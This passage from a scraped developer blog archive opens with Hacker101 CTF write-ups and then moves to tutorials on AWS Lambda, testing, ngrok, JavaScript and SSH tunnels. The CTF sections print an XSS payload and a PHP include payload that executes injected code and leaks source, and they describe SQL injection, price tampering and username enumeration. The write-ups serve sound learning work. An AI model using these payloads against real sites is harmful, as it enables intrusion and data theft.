8? 於是就 8 7 6 回去一個一個看看是不是有什麼玄機發現 id 是 6 的時候，出現了 forbidden 的字樣，寫著不可讀 竟然不可讀的話，試著加上 edit 發現可以編輯，且內容有 FLAG 0x02接下來就試著對每一個頁面的 id 做 SQL Injection發現在 edit 的頁面狀況下，id 會有 SQL Injection於是就跳出 FLAG 了 0x03這個漏洞我找非常非常的久才發現原來的 &lt;svg/onload=alert('xss') payload 是跳不出 FLAG 的要用 &lt;img src=&quot;&quot; onerror=&quot;javascript:alert('xss')&quot;/&gt; 才跳得出來 打開原始碼發現 FLAG 就藏在下面第一張是 img tag 的原始碼第二張是 svg tag 的原始碼兩個都可以觸發 xss，但只有 img 有 FLAG不知道為何 svg 那一個 payload 不能觸發可能是這題的解答，有希望某一些固定的 tag 去寫才會造成 svg payload 跳不出 FLAG Petshop Pro根據題目總共有 3 個 Flag 0x00進去之後頁面長這樣 按下 Add to Cart 之後 在按下 checkout 看來是一個結帳流程，講到錢就想來試試看能不能 0 元結帳看了一下 source code 發現有一個 hidden input 並且用 javascript 把價格更改成 0 元後送出 送出後價格為 0 元且拿到 FLAG 0x01透過 nmap 找到登入點為 /login 之後 稍微試著輸入單引號看看會不會有 SQL Injection 問題，結果沒有 QQ但因為輸入 username 的時候，輸入錯誤會爆出 Invalid username代表說此系統設計方式，如果輸入正確的 username 的話，應該不會爆出這個錯誤根據以上邏輯先寫出第一版程式找找看 username 找到 username 後輸入，的確變成 Invalid password那就繼續找密碼 接下來用一樣的方式找到密碼 登入成功，出現 FLAG! 0x02登入後發現可以編輯商品 試著輸入 xss payload，跳出 xss，但打開原始碼沒發現任何東西 試著加入購物車發現，也會跳出 xss 打開原始碼發現 FLAG!","link":"/2019/09/06/hacker101-part2/"},{"title":"Hacker 101 CTF Write Up Part 5 - Cody's First Blog","text":"Cody’s First Blog這題總共有 3 個 flag 0x00一開始畫面長這樣 裡面有提到好像是用 php 建立的試著提交看看 &lt;?php echo phpinfo(); ?&gt;就得到第一個 FLAG 了，但好像沒有像想像中一樣可以直接 phpinfo 0x01接下來看一下 source code 發現一個特別的地方 被註解掉的 admin path Path: http://34.74.105.127/8a10550a14/?page=admin.auth.inc發現看到可以登入的地方 嘗試輸入 username 看會不會有列舉的漏洞以及輸入一些弱密碼嘗試登入全部都不行，暫時就先擱置不看 這邊就開始有點卡住了 …回去首頁看看有什麼特別的東西有一句話有提到有用到 include 這個 function而剛剛的參數中 ?page=admin.auth.inc 是登入用的 php接下來這邊試著改成 ?page=admin.inc 發現就 bypass 登入的機制到 admin 頁面了然後就發現 FLAG 以及可以 approve 剛剛 submit 的 comment 0x02按下 approve，是一個 GET Url嘗試對 approve 做 SQL Injection 檢測發現沒有問題 接下來回到首頁，檢視原始碼發現一個特別的東西一開始輸入的參數被 approve 後顯示在這裡有點特別，但因為不能執行所以沒什麼用就先擱著不動 接下來嘗試對 page 參數亂打 看來的確是用 include 去引入別的檔案而且還會再參數後面再加入 .php 的副檔名 這邊嘗試用 php://filter 看能不能讀取原始碼結果發現不能 QQ 看到 include 後回想起首頁提到的這個 server 不能對外連線，也只有作者可以上傳檔案以及他都是用 include 去引用檔案 這裡聯想到一件事情include 是不是也能用 http:// 去把檔案引入並執行呢?於是這邊嘗試引用 http://34.74.105.127/8a10550a14/?page=http://localhost/admin.inc發現可以引用成功，但還是沒有提供什麼資訊 但因為用 include 配合 http:// 會有一個特色假如 test2.php 內容為12&lt;?php $body = \"&lt;?php echo phpinfo(); ?&gt;\" ?&gt;&lt;p&gt;&lt;?php echo $body ?&gt;&lt;/p&gt; test3.php 內容為1&lt;?php include(\"test2.php\") ?&gt; 直接讀取 test2.php 的時候，是沒辦法執行 phpinfo()只會出現這樣的結果 讀取 test3.php 時這邊會出現跟直接讀取 test2.php 一樣的結果 但如果把 test3.php 改成用 http:// 協議會怎麼樣呢?1&lt;?php include(\"http://localhost:7888/test2.php\") ?&gt;它會把 test2.php 顯示的結果，當成原始碼繼續使用下去結果就會變成可以成功執行 phpinfo 了 那因為剛剛一開始頁面也有一樣的邏輯出現首頁也有顯示 &lt;?php echo phpinfo(); ?&gt; 那如果說有辦法，讓這個頁面在被 include 一次的話就可以成功執行 phpinfo() 了所以 payload 會改成以下http://34.74.105.127/8a10550a14/?page=http://localhost/index然後就成功可以執行了 重新輸入一個參數 &lt;?php readfile(&quot;index.php&quot;) ?&gt; 並且 approve回到首頁檢視原始碼發現 FLAG !","link":"/2019/09/14/hacker101-part5/"},{"title":"如何用 AWS API Gateway 和 Lambda 上傳和下載檔案 -- Part 1","text":"這篇主要是記錄如何利用 AWS lambda 和 AWS API Gateway 做檔案的上傳以及下載在 API Gateway 中要做幾項設定才有辦法達成加上 Lambda 不能回傳『完整』的 binary 所以必須搭配 API Gateway mapping template 調整這篇不會一步一步教學開 API Gateway 和 Lambda，只記錄重點部分 API Gateway主要調整得地方有兩個 /upload Integration Request /download Integration Response 另外還有一種特別的方式，是利用 API Gateway 的 Binary Support 去處理這種方式會列在最後面 /upload Integration Request 到 body mapping template 底下調整成圖片樣子(Generate templaye 選擇 “Method Request passthrough”) 12345// 需要修改的部分為第一行的 body// 其他行不需要做調整{ \"body\": \"$util.base64Encode($input.body)\"} /download Integration Reponse 到 body mapping template 底下調整成圖片樣子 1$util.base64Decode($input.body) Lambda主要是用 nodejs 去編寫處理上傳的部分 Handle upload request1234567891011const multipart = require('parse-multipart');exports.handler = (event, context, callback) =&gt; { // convert base64 string to binary const buffer = new Buffer(event.body, 'base64') const boundary = multipart.getBoundary(event.params.header['Content-Type']) const parts = multipart.Parse(buffer, boundary) return callback(null, { s: parts }) } Handle download request這邊範例是用去讀取 S3 的檔案 12345678910111213141516exports.handler = (event, context, callback) =&gt; { s3.getObject({ Bucket: 'your-bucket', Key: 'download_file.json' }, (err, data) =&gt; { if (err) { return callback(err) } // 原本方式是會直接回傳 JSON (DEMO 有圖) // callback(null, data.Body) // // 正確方式，回傳 base64，然後讓 API Gateway 去 decode callback(null, new Buffer(data.Body).toString('base64')) })} Demo with PostmanUpload File上傳要注意選 “form-data”然後隨便選擇一個檔案即可 Download File如果沒有在 API Gateway 做調整的話會變成沒錯，Lambda 是會直接回傳 JSON 的他並不會回傳 binary 給你，所以才要到 API Gateway 和 Lambda 做一些調整 (要到 mapping template 調整) 修改之後 然後可以改用程式下載檔案 123456const request = require('request')const fs = require('fs')const r = request.post('your_url')r.on('response', function (res) { res.pipe(fs.createWriteStream('download_file.json'))}); 額外補充 - Binary Support/upload integration request在 API Gateway 底下的 binary support 加上 multipart/form-data，API Gateway 就會自動幫我們做 base64 encode 而在 mapping template 就改成這樣即可lambda 不需要做任何調整 123{ \"body\": $input.json('$')} 註記 API Gateway payload 有限制 10mb Lambda 有限制 6mb 所以最大只能上傳或下載 6mb 的檔案但是，因為會轉成 base64，所以原本的 4mb 轉完可能變成 5mb這裡是特別要注意的地方","link":"/2017/11/04/handle-file-with-Lambda-and-API-Gateway/"},{"title":"如何用 AWS API Gateway 和 Lambda 上傳和下載檔案 -- Part 2","text":"前言這次記錄是介紹，只透過 AWS API Gateway 不加上 AWS Lambda 做檔案的上傳上一篇因為 Lambda 的特性是 Request 和 Response 都要是 JSON所以必須在 API Gateway 必須要做 body mapping 的調整e.g 透過 Binary Support 或是 Base64Enconde 的方式處理那這次的紀錄是讓 AWS 的 API Gateway 的 Upload 直接通往到後面的 Server 端 AWS API Gateway在上一篇，透過 Lambda 和 API Gateway 完成檔案上傳和下載之後出現了一個疑問，API Gateway 直接到 Server 這端，需不需要調整東西呢 ? 在這樣的想法下，做了一個簡單的實現 在 API Gateway 新增一個 API /upload (POST Method) 用 nodejs 啟動 server (記得把 body-parser 改成 text 也支援的設定)在這樣的實驗之下，發現 Request 的 Content-Type 只有帶 multipart/form-data並沒有帶後面的 Boundary，這樣會沒有辦法去 Parse 上傳的檔案或是 text那會這樣的原因只會有一個，那就是 API Gateway 對我的 Headers 做了手腳 後來的解決方式，是把設定 API Gateway 為 Proxy，就可以讓 bounday 成功 pass 到後端 Server那這後面就會介紹如何設定 API Gateway (基本上就只有一個地方，Integration Request &amp; Integration Response) Upload只要把 HTTP Proxy Integration 打勾即可，不用像上一篇要到其他地方做設定 ServerUpload12345678910const express = require('express')const app = express()const bodyParser = require('body-parser')app.use(bodyParser.text({type: '*/*'}))app.post('/upload_file', (req, res, next) =&gt; { console.log(req.body); console.log(req.headers); res.json({})})app.listen(8080) DEMOUpload從上傳的地方會看到 content-type 最後面會出現 boundary如果 API Gateway 沒有設成 Proxy 的話，是不會出現 不會出現的話，會沒辦法用 content-type 後面的 boundary 去 parse 檔案的因為檔案之間會用 boundary 去區分，沒了這個就沒辦法識別傳了什麼上來","link":"/2017/11/15/handle-upload-download-file-with-Lambda-and-API-Gateway-2/"},{"title":"關於『測試』這件事","text":"為什麼要測試?確保你程式的結果跟你預期所想的一樣那這樣有什麼好處?這樣大概會讓你少加班好幾小時吧 …. 下面我會介紹如何用 mocha 去做測試小弟我對測試並沒有鑽研到很深的地步，如果有任何奇怪的地方，歡迎指教 ~ 介紹測試是為了確保你的程式結果跟你預期所想的一樣那我們又該如何去測試？那又該測試什麼東西？ 在這邊我把該測試的東西分成三個方向，由小到大這篇文章重點會放在 Unit Test 的部分，其他會以 Unit Test 的概念延伸說明 Unit Test (本篇重點)測試你的 function 有沒有輸出正確結果 API Test測試跟 API 相關的 Unit 有沒有正確執行 User Story Test測試整個使用情景有沒有跟使用者所想的一樣 準備在開始要做測試之前需要安裝以下幾樣東西1234// mocha 測試主要會用到的東西// chai 一個很好用的 assertion library// axios 發 request 用的 librarynpm install mocha chai axios 該建立的資料夾 12345|--- package.json|--- node_modules|--- test| |--- test.js 如何測試想像一下我們現在有一個需求進來了『我要把我丟進去的數字都變成一個陣列然後回傳回來』 所以根據這個狀況我可以列出一個測試的方式12345678910// First Test Case in test.jsconst {assert} = require('chai')describe('Unit Test', function() { it('Test function with one number', function () { const result = transformToArray(1) assert.equal(typeof [], typeof result) assert.equal(1, result.length) });})測試列出來了，但是程式完全還沒寫於是接下來先寫主要功能的程式 12345678// 這程式想放哪都可以，記得 require 近來就好function transformToArray (number) { return [number]}transformToArray(1)// result should be [1] 程式寫出來之後，可以正式執行測試了依照這個 test case 我們的程式是有正確執行的 接下來我在列出另一個 test case123456789101112131415// First Test Case in test.jsconst {assert} = require('chai')describe('Unit Test', function() { it('Test function with one number', function () { const result = transformToArray(1) assert.equal(typeof [], typeof result) assert.equal(1, result.length) }); it('Test function with multiple numbers', function () { const result = transformToArray(1, 2, 3, 4) assert.equal(typeof result, typeof []) assert.equal(result.length, 4) })}) Oops, test case 出錯了，代表我的程式爆炸了這時候該怎麼辦？那就是回去繼續修改我的程式讓他可以通過這個 test case 進行修改後，程式變成這樣 123456789// Version 2 程式const transformToArray = function () { let temp = [] for (const i of arguments) { temp.push(arguments[i]) } return temp} 登愣，我們執行結果正確了 但是總覺得程式好像沒有寫得很漂亮於是改成 1234567// Version 3 的程式const transformToArray = function () { return Object.keys(arguments).map((key) =&gt; { return arguments[key] })} 在我們剛剛列出 test case 然後修正程式去符合新的 test case這整個開發流程，就屬於 TDD 的方式 列出 test case 開發程式 Passed or Failed Refactor 不過我個人是喜歡 BDD 的開發方式，兩個的主要差別我列在下面 Test-driven Development 的方式，是以測試為主，列出各種 test case 讓程式可以正確執行 Behavior-driven Development 的方式跟 TDD 很相似，但是他會以規格為主(有點像訂出 User Story 的感覺) BDD 比較符合我們現時開發上的流程，客戶需求進來變成一個 User Story，根據 User Story 寫出 Test Case接下來就是開發程式，讓程式可以通過這個 Test Case 那關於測試 API 和 Uesr Story 的方式大體上跟 Unit Test 很相似，差在 Test Case 的寫法不太一樣而已 對 API Test 來說，可能是 3 ~ 4 Unit 合成的一個 API例如 API 是『登入』，對登入來說 Input 是帳號密碼，Output 是有無驗證成功帳號密碼的驗證可能牽扯到 3 ~ 4 Unit，但是這已經在 Unit Test 那邊完成了所以對於 API Test 來說，可能會列出以下幾種 Test Case 輸入正確帳號密碼，成功登入 輸入錯誤帳號密碼，無法登入 輸入正確帳號錯誤密碼，無法登入 輸入錯誤帳號正確密碼，無法登入 對 User Story 來說，可能是 3 ~ 4 個 API 合成的一個功能假如使用情形是，使用者登入了賣書網站搜尋了他想要的書本，根據搜尋會顯示或是找不到書本給使用者看那對於 User Story Test 來說，可能會列出以下幾種 Test Case First Test Case 輸入正確帳號密碼，成功登入後 在搜尋欄位輸入『nodejs』 然後顯示 nodejs 書籍 Second Test Case 輸入正確帳號密碼，成功登入後 在搜尋欄位輸入『找不到』，然後顯示搜尋結果為 0 筆的頁面 結語我認為用什麼樣的開發流程去測試程式都可以BDD TDD ATDD 等等，都是很好的開發流程對於不同團隊都會有各個團隊習慣的方式但最重要的是，要有『測試』這件事情出現在專案的開發流程上就足以","link":"/2017/11/01/how-to-test/"},{"title":"Ngrok - Connect to your localhost!","text":"今天要介紹的是一個非常好用的東西，可以直接讓大家都連到你的 localhost這樣做完一個網站，你也不用特地部署，可以直接透過這個工具，大家都能連到 工具連結在此: Ngrok 使用方式簡單介紹下載下來後，unzip 之後就可以做使用了如果在 localhost 開了一個 8080 想讓大家連可以在下這以下這行指令 1./ngrok http 8080 結果會長這樣，然後在網址列打上他給你的網址就可以直接連到你的 8080 port 如果像是要用到 Apple Pay 一些特定服務只允許跑在 SSL 上面的話這個工具會非常有用，但畢竟是經過別人家重導 …. 所以小心用","link":"/2017/11/08/ngrok/"},{"title":"JavaScript this 是什麼? 如何運作的呢?","text":"前言\b\b\b相信寫過 js 的人對於 this 都有一定的認識但要搞懂它真的不容易，js 的 this 並沒有其他語言的 this 那麼單純所以這邊要一步一步的去展示並介紹 js 中的 this 到底是怎麼一回事以及最後面教學如何一步一步判定 this 會是指向什麼 this \b是什麼 ？this 單純看英文解釋的話，是代表『自身』聽起來好像有這麼一回事，但實際上使用起來根本不是這樣實際上 js 中 this 代表的是執行時的對象，並不代表自身簡單來就說就是找函數被調用的位置 讓我們看看以下的範例 1234567891011121314function foo(num) { console.log( `foo: ${num}`) this.count++;}foo.count = 0;for (let i = 0; i &lt; 10; i++) { if (i &gt; 7) { foo(i); }}// foo: 8// foo: 9// foo 被調用多少次console.log(foo.count) // 0 --- ??? 為什麼是 0 ?? 雖然 console.log 真的有跑出來 foo 的兩個輸出但 foo.count 卻還是 0這其中的原因是，真正執行 foo 調用的位置的地方是全域(瀏覽器中為 window 物件)注意到這點回去可以執行這行 window.count 會發現為 NaN，卻不是 undefined 那我在這邊該如何去把 this.count 綁定到我的 foo.count 上面呢?這裡可以透過 fn.call(thisArg, arg) 的方式把我們的 this 綁定到 foo 上面在 for loop 之中調用 foo 得方式更改為 foo.call(foo, i) 就可以完成綁定重新執行以上的程式就會發現 foo.count 變成 2 了！ 然而要如何尋找呼叫位置以及善用 this 就是一件學問了而用 this 有什麼好處? 看看以下這段 code 12345678910111213141516function foo(num) { console.log( `foo: ${num}`) data.count++;}var data = { count: 0}for (let i = 0; i &lt; 10; i++) { if (i &gt; 7) { foo(i); }}// foo: 8// foo: 9// foo 被調用多少次console.log(foo.count) // 2 沒有用 this 去做綁定，而是用一個變量的方式去儲存雖然這樣一樣看達到效果，但這看起來就不太簡潔未來要重複使用也很不方便而這就是學好 this 的好處之一 看到這邊應該會 this 有簡單的理解了那對於以下這段 code 應該就能清楚知道會出現什麼結果了 123456789101112131415161718function identify() { return this.name;}function speak() { var greeting = \"I 'm\" + identify.call(this); console.log(greeting)}var me = { name: \"Jack\"};var you = { name: \"Reader\"}identify.call(me) // Jackidentify.call(you) // Readerspeak.call(me) // Jackspeak.call(you) // Reader this 綁定規則前面提到要如何去找到調用位置是重要的事之外還要理解 js 中是有哪些規則去綁定 this 的以下會開始介紹 js 的幾種綁定方式但就個人來說，盡量使用顯示綁定的方式去把 this 綁定到對的對象上面才是正確的做法 Default Binding (默認綁定)這條為無法應用其他規則的時候，默認會出現的綁定模式請看以下的 code 12345function foo() { console.log(this.a);}var a = 2;foo(); // 2 這邊可以注意到 var a = 2 是在全域下的一個全局變量所以裡面的 this.a 是指向到全域的變量 a還有個方法可以確認說有沒有真的綁定到，可以透過 use strict 嚴格模式去做測試 123456function foo() { \"use strict\"; console.log(this.a);}var a = 2;foo(); // TypeError Implicit Binding (隱式綁定)這條隱式綁定的規則，則是要取決於上下文 12345678910function foo() { console.log(this.a);}var obj = { a: 2, foo: foo};var bar = obj.foo;var a = \"HIHI\"; // Globalbar(); // \"HIHI\" 雖然 bar 是 obj.foo 的一個引用，但實際上它是對應到 foo 上還有一種狀況很特別，當把 function 當成 args 傳進去執行 12345678910111213function foo() { console.log(this.a);}function doFoo(fn) { fn()}var obj = { a: 2, foo: foo};var bar = obj.foo;var a = \"HIHI\"; // GlobaldoFoo(obj.foo); // \"HIHI\" 這邊可以發現當把函數存進去後, obj.foo 的 this 是被綁定在 global 上 Explicit Binding (顯式綁定)顯式綁定會透過三個函數去使用call apply bind 的方式去做到這件事做法的話，前面應該有看到過了，這邊重新複習一下 1234567function foo() { console.log(this.a)}var obj = { a: 2};foo.call(obj); // 2 這邊可以注意到我們把 foo 裡面的 this.a 綁定到 obj 上面了 new Binding先說明 js 之中的 new 和其他 class 類型的語言是完全不一樣的東西在 js 之中使用 new，並不會真的屬於什麼類或是實例化一個類 (嚴格來說 js 中也沒有所謂的類，全部都是物件)而在使用 new 的時候會有以下幾個步驟 創建全新物件 新物件會被執行原型鏈的連接 新物件會綁定到函數調用的 this 如果函數沒有返回其他物件，那麼 new 會自動返回這個新物件，若有返回其他物件，則替換掉新物件 12345function foo(a) { this.a = a;}var bar = new foo(2);console.log(bar.a); // 2 以上的範例來說明上面的四個步驟bar 為 創建全新物件，建立出 bar 之後會對 Object 的原型鍊做連接 (這裡暫時不提)因為 bar 為新物件，所以根據新物件會綁定到函數調用的 this這時 bar 就會被綁定在 foo 函數裡面的 this 去了那因為在使用 new foo(2) 時，並沒有返回其他物件，所以這裡會把 bar 回傳回去但如果這時有返回其他物件，這時候就會把 bar 也改替換掉了這時第三步原本是把 this 綁定在 bar 本身，這時會變成綁定在其他物件身上參考以下 code 12345678910var test = { a: \"hihi\"}function foo(a) { this.a = a; return test;}var bar = new foo(2);console.log(bar.a); // \"hihi\" 不過如果回傳的並不是物件的話，狀況又會不一樣了 123456function foo(a) { this.a = a; return 1;}var bar = new foo(2);console.log(bar.a); // \"2\" 後記這是看完 You don’t know JS 後做的一篇整理如果有任何錯誤歡迎指教！而整本書對於 this 的解釋非常詳細，如果有興趣的讀者可以找找這本書看看原文是如何寫的吧！後續會再找時間整理關於 prototype (原形鏈) 的原理","link":"/2019/04/24/javascript-this/"},{"title":"TODO - vue + vuex + vue-router","text":"這篇文章主要在記錄如何用 vue + vuex + vue-router做出一個簡單的 TODO List 專案DEMO 網站Source Code 先來訂一個 TODO List 的簡單需求表 能夠輸入項目 能夠打勾確認完成 能夠刪除項目 能夠選擇顯示全部, 未完成, 完成的項目 程式部分則會分為一個 vuex store 和三個 components 專門控管資料的 store 輸入項目 component 顯示項目 compoent 選擇完成狀態的 component 專門控管資料的 storestore.js12345678910111213141516171819202122232425262728293031import Vue from 'vue';import Vuex from 'vuex';Vue.use(Vuex)const store = new Vuex.Store({ state: { lists: [], status: '', // 去更新要顯示什麼狀態的項目 counter: 0 // 當作 increment id 用 }, // 宣告可以更改的方式 mutations: { addItem (state, new_item) { state.counter += 1 new_item.id = state.counter state.lists.push(new_item) }, changeStatus(state, id) { state.lists = state.lists.map((list) =&gt; { if (list.id === id) list.is_completed = !list.is_completed return list }) }, deleteItem(state, id) { state.lists = state.lists.filter((list) =&gt; { if (list.id === id) return false; return true; }) } }})export default store; 輸入項目 componenttodo-input.vue12345678&lt;div&gt; &lt;form class=\"ui form\" @submit.prevent=\"submit\"&gt; &lt;div class=\"field\"&gt; &lt;label for=\"\"&gt;List&lt;/label&gt; &lt;input type=\"text\" v-model=\"item\"&gt; &lt;/div&gt; &lt;/form&gt;&lt;/div&gt; 12345678910111213141516export default { data() { return { item: '' } }, methods: { submit() { this.$store.commit('addItem', { name: this.item, is_completed: false }) this.item = '' } }} 顯示項目 componenttodo-item.vue1234567891011121314151617181920212223242526272829303132&lt;div&gt; &lt;table class=\"ui table stackable fixed\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th colspan=\"3\"&gt;Item&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr v-for=\"(list, index) in lists\"&gt; &lt;td :class=\"{completed: list.is_completed}\"&gt; {{list.name}} &lt;/td&gt; &lt;td&gt; &lt;!-- 綁定 done method, 並傳入 id 去做勾選完成--&gt; &lt;button class=\"ui icon inverted green button\" @click=\"done(list.id)\"&gt; &lt;i v-if=\"list.is_completed === false\" class=\"checkmark icon\"&gt;&lt;/i&gt; &lt;i v-else class=\"reply icon\"&gt;&lt;/i&gt; &lt;/button&gt; &lt;/td&gt; &lt;td&gt; &lt;!-- 綁定 remove method, 並傳入 id 去做刪除 --&gt; &lt;button class=\"ui icon inverted red button\" @click=\"remove(list.id)\"&gt; &lt;i class=\"trash icon\"&gt;&lt;/i&gt; &lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;/div&gt;&lt;style scoped lang=\"css\"&gt;.completed { text-decoration: line-through}&lt;/style&gt; 123456789101112131415161718export default { computed: { status () { return this.$store.state.status }, lists() { return this.$store.getters.filtered_list } }, methods: { remove(id) { this.$store.commit('deleteItem', id) }, done(id) { this.$store.commit('changeStatus', id) } }} 選擇完成狀態的 coomponenttodo-display.vue1234567&lt;div&gt; &lt;select class=\"ui dropdown\" v-model=\"status\"&gt; &lt;option value=\"\"&gt;Show All&lt;/option&gt; &lt;option value=\"done\" selected&gt;Show Done&lt;/option&gt; &lt;option value=\"nondone\"&gt;Show None-done&lt;/option&gt; &lt;/select&gt;&lt;/div&gt; 123456789101112export default { computed: { status: { get () { return this.$store.state.status }, set (value) { this.$store.commit('setFilter', value) } } }}","link":"/2017/09/23/todo-vue/"},{"title":"callback, promise, async/await 使用方式教學以及介紹 Part I","text":"[Update 2019-05-02] 關於 Error Handing 可以看下一篇文章 這篇主要紀錄 callback, promise, async/await 的使用方式以及為何會從到 callback 和 promise 的 hell world 進入到 async/await 這兩兄弟的世界建議閱讀的人要有 Javascript 的基礎概念，包括對 non-blocking, event-driven 的觀念有一些涉略 CallbackCallback 是 JS 很常用的一種使用方式簡單來說，就是把 function 當作參數傳進去使用以下是簡單的使用範例123456789101112function test() { console.log(\"This test function is done.\")}function main(callback) { console.log(\"This is main start.\") callback() console.log(\"This is main end.\")}main(test)// This is main start.// This test function is done.// This is main end. 但是 callback 使用上往往沒那麼簡單，基本上都會牽扯到 API 相關的用法所以會變成下面這樣的方式12345678910111213141516function test() { // 這邊模擬 test 這個 function 去 call 其他 API 要等待的情況 // 等了一秒後才會執行 console.log 這個函式 setTimeout(()=&gt; { console.log(\"This test function is done.\") }, 1000)}function main(callback) { console.log(\"This is main start.\") callback() console.log(\"This is main end.\")}main(test)// This is main start.// This is main end.// This test function is done. 這邊會發現，This is main end. 反而先執行印出來了, 這裡牽扯到 non-blocking 的概念, 將會放在別的章節重新介紹那如果我想要 This is main end. 在最下面的話該怎麼做呢?做法上只要把執行 This is main end. 的函示也當成 callback 傳進去就可以按照順序執行下來了123456789101112131415161718function test(callback2) { // 這邊模擬 test 這個 function 去 call 其他 API 要等待的情況 // 等了一秒後才會執行 console.log 這個函式 setTimeout(() =&gt; { console.log(\"This test function is done.\") callback2() }, 1000)}function main(callback) { console.log(\"This is main start.\") callback(() =&gt; { console.log(\"This is main end.\") })}main(test)// This is main start.// This test function is done.// This is main end. 用 callback 解決的非同步的問題, 但是當越來越多 callback 串再一起就會變成 callback hell, 如同下面這樣12345678910111213141516171819202122232425function api1(callback) { setTimeout(() =&gt; { console.log(\"Done with api1\") callback() }, 2000)}function api2(callback) { setTimeout(() =&gt; { console.log(\"Done with api2\") callback() }, 1000)}function main(callback) { api1(() =&gt; { api2(() =&gt; { callback() }) })}main(() =&gt; { console.log(\"All function is done.\")})// \"Done with api1\"// \"Done with api2\"// \"All function is done.\" 當越來越多 API 要按照順序做下去的時候就會很恐怖了，會變成這樣123456789api1(() =&gt; { api2(() =&gt; { api3(() =&gt; { api4(() =&gt; { // bla bla bla }) }) })}) Promise介紹完 callback 之後，一定要介紹他的好兄弟 PromisePromise 是一個可以對非同步進行處理以及進行各種操作的東西通常 Promise 會包含三種狀態 resolve reject pendingresolve 代表成功 rejetc 代表失敗, pending 代表還在處理中, 結束狀態未知以下有兩種方式得知結果resolve 會觸發 onSuccessful, reject 會觸發 onFailedpromise.then(onSuccessful, onFailed)promise.then(onSuccessful).catch(onFailed)以下是 Promise 的使用範例123456789101112131415161718192021222324function test(number) { return new Promise((resolve, reject) =&gt; { if (number === 1) { resolve(\"Success\") } else { reject(\"Failed\") } })}function main() { test(1).then((result) =&gt; { // result === \"Success\" console.log(result) }).catch((error) =&gt; { // 不會被執行, 因為狀態是成功 }) test(2).then((result) =&gt; { // 不會被執行, 因為狀態是成功 console.log(result) }).catch((error) =&gt; { // error === \"Failed\" console.log(error) })} Promise 的基本介紹完之後，一定都會提到一個 Promise Chain 的概念簡單來說就是我可以一直 then 下去，直到海枯石爛, 只要我在 resolve 或是 reject 的狀態下，return 任何東西都可以 then 下去12345678910111213141516171819202122232425262728293031function test(number) { return new Promise((resolve, reject) =&gt; { if (number === 1) { resolve(\"Success\") } else { reject(\"Failed\") } })}function main() { test(1).then((result) =&gt; { // result === \"Success\" console.log(result) // return \"Next One\" return test(1) }).then((result) =&gt; { // result === \"Next One\" console.log(result) })}function main2() { test(2).then((result) =&gt; { // result === \"Success\" console.log(result) // return Promise 的物件也是可以的喔 return test(1) }).then((result) =&gt; { // result === \"Success\" console.log(result) })} 但是按照這樣的寫法下去, 又會變成另一種 then hell 的概念於是接下來出現了 async/await 這兩兄弟 async/awaitasync/await 基本上是一種語法糖, 把 Promise 的重新包裝起來然後做使用可以不用再透過 then 的方式去執行 Promise使用方式會變成以下這樣123456789101112131415function test(number) { return new Promise((resolve, reject) =&gt; { if (number === 1) { resolve(\"Success\") } else { reject(\"Failed\") } })}async function main() { var result = await test(1) // result === \"Success\" console.log(result)}main() 記得在使用 await 的時候, function 前面一定要加上 async所以當我有很多 API 要使用的話, 就會變得很乾淨12345async function main() { let result1 = await test1() let result2 = await test2() let result3 = await test3()} 結語這 Part 主要是快速介紹使用教學方式下一部分會介紹在這三種使用方式裡面是如何做到 Error Handling","link":"/2018/07/22/promise/"},{"title":"關於 SSH Tunnel 連線 (SSH Proxy, SSH Port Forwarding)","text":"這篇主要在介紹 SSH Tunnel 是什麼東西以及教學如何使用 使用情境介紹一般來說會使用到 SSH Tunnel 的其中一個情境會是這樣子的 這裡有兩台機器，分別為 A BB 為重要的服務或是資料A 為我們本身的主機，作為本地端開發時使用的 (開發會需要用到 B 的服務或是資料) 這時候我們總不能每一次在 A 把程式打完，就一次一次把程式放到 B 上面去跑這件事實在是太麻煩了（汗所以可以的話希望可以直接在 A 機器上面就能夠讀取到 B 的服務或是資料這樣的話就能夠方便直接在本地開發而要達成這件事情的方法就是透過 SSH Tunnel 的方式去達成 SSH Tunnel 介紹\bSSH Tunnel 在者裡面扮演的角色可以這樣思考 你在住家附近有一口水井，但你水井完全是沒有水可以取用然後在距離很遠的地方有一個水庫，要喝水的必須到水庫取水並放回住家附近的水井有一個作法就是，把水井和水庫之間挖一條通道，讓水庫的水直接導入到水井這個通道就是我們 SSH Tunnel 扮演的角色 而用比較技術的說法的話，SSH Tunnel 就是做到了 Port Forwarding 的功用 SSH Tunnel 使用方式這邊主要會是用 Linux 原生指令 ssh 去完成 SSH Tunnel在這之前我們先回想一下 ssh 連線的方式！ 當已經有一台 server 上面跑著一個網頁的服務而你可以透過以下指令 ssh 連線到那一台 server 上ssh root@127.0.0.1ssh 連線上去之後，上面有跑一個 Nginx 的服務在 80 port這時候在 server 上執行 curl localhost 會發現有成功回傳 Nginx 的 Hello 頁面 此時如果你想要在自己的電腦上就能讀取這個網頁或是資料庫該怎麼辦?這邊我們就要介紹 -L 這個 option 可以幫你達成這個目標！Template: ssh -L [local_port]:localhost:[remote_port] root@127.0.0.1 所以如果我要把 server 上的 80 port 網頁服務導入到本地端的 8080 port 該怎麼做呢?可以使用以下這行指令ssh -L 8080:localhost:80 root@127.0.0.1然後在瀏覽器打開 http://localhost:8080 即可看到 server 上面的網頁！ 接著又有另一種情境出現了就是在 server 上要讀取 local port 的服務的時候該怎麼辦呢?這裡就可以使用另一種相反的方式，也就是透過 -R 去達成-R 簡單來說就是反過來，你可以把本地機器上的服務 port 導入到 server 讓他連線！Template: ssh -R [remote_port]:localhsot:[local_port] root@127.0.0.1 舉例來說，在本地端起了一個 8080 port 的服務如果要在 server 上 6666 port 讀取的話可以透過以下方式取得！ssh -R 6666:localhost:8080 root@127.0.0.1 後記最近還蠻常會使用到這個方式去連線，於是在這邊特別把它記錄下來然而這種方式只是圖個方便，需要的時候做個 forwarding 而已","link":"/2019/01/08/ssh-tunnel/"},{"title":"Module Export","text":"稍微紀錄一下在 nodejs 裡面 module.exports 和 require以及在 ECMA6 的 export 和 import 的使用方式 nodejs首先先在 a.js 裡面 export 出一個 object 裡面包含一個 click function然後再 b.js 裡面用 require a.js，這時候會有兩種使用方式 1234567891011121314151617// a.jsmodule.exports = { click: () =&gt; { console.log('Hi') }}// b.js// 第一種const a = require('./a.js')a.click()// Hi// 第二種const {click} = require('./a.js')click()// Hi 另外一種使用方式也可以達到同樣效果 1234567891011121314151617181920// a.jsmodule.exports = () =&gt; { // 